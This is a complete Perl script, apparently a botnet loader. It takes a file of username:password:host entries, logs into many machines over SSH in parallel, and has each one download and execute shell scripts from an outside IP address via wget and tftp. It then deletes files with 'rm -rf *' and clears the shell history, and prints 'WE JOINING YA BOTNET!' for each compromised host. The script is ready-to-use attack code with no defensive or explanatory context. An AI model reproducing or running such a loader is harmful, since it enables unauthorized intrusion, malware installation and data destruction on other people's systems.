#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /run || cd /; wget http://20.213.158.30/obas!.sh; chmod 777 obas!.sh; sh obas!.sh Cipher; tftp 20.213.158.30 -c get obas!tftp1.sh; chmod 777 obas!tftp1.sh; sh obas!tftp1.sh Cipher; tftp -r obas!tftp2.sh -g 20.213.158.30; chmod 777 obas!tftp2.sh; sh obas!tftp2.sh Cipher; rm -rf obas!.sh obas!tftp1.sh obas!tftp2.sh; rm -rf *;history -c');
                        sleep 10; 
                        $channel->close;
                        print "\e[1;37mWE JOINING YA BOTNET!: ".$newarray[$c]."\n";
                } else {
                        print "\e[1;32mAttempting Infection...\n";
                }
        } else {
                print "\e[1;31mFailed Infection...\n";
        }
        $pm->finish;
}
$pm->wait_all_children;
